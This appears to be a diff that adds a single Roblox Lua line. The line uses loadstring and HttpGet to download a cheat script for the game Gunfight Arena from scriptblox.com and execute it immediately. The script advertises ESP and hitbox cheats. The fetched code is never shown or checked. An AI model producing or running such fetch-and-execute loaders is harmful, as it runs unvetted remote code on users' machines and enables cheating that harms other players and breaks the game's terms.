@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptblox.com/raw/Gunfight-Arena-or-NEW-MODE-esp-tix-hitbox-13276"))()
